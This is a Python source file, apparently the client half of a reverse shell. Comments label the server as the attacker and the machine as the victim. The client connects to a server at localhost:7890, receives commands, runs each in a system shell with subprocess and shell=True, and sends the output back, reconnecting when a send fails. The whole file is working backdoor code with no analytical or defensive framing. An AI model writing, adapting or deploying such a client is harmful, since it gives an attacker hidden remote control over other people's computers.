import subprocess
from command_payload import CommandPayload
from command_payload import parse_payload_to_output
from secure_socket import SecureSocket


# Attacker server ip and port
ip = "localhost"
port = 7890


# Create the victim socket that keep trying to connect to the server
def create_socket():
    secure_socket = SecureSocket()
    secure_socket.connect()
    while True:
        # Receive data from the server
        payload = secure_socket.receive(parse_payload_to_output)
        if type(payload) is not CommandPayload:
            continue
        command = payload.command
        print('Received:'.center(40, "="))
        print(command)


        # Generate command
        stdout, stderr = run_command(command)
        payload = CommandPayload(stdout=stdout, stderr=stderr)
        packet = payload.pack()

        try:
            secure_socket.send(packet)
        except:
            create_socket()


# Run a line of shell command and returns the result
# Todo: Keep one subprocess alive
def run_command(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = str(proc.stdout.read().decode("utf-8")), str(proc.stderr.read().decode("utf-8"))
    print(result)
    return result


def main():
    create_socket()


if __name__ == '__main__':
    main()
